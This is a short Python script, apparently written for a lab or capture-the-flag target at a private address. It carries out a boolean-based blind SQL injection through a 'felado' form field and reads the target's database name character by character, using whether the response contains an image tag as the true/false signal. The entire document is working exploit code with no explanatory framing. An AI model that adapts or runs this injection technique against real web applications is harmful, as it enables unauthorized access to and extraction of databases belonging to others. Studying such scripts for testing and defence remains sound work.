import requests
r = requests.post('http://10.10.8.11:8666/', auth=('user', 'pass'))

url = "http://10.10.8.11:8666/"
chars = "abcdefghijklmnopqrstuvwxyz01234567890."

db = ""

while True:
    br = True
    for char in chars:
        expr = f"Database() LIKE '{db}{char}%'"
        data = {"felado": "' AND " + expr +";#"}
        resp = requests.post(url, data = data)
        found = "<img" in resp.text
        if found:
            db = db + char
            br = False
            print(db)
            break
    if br:
        break
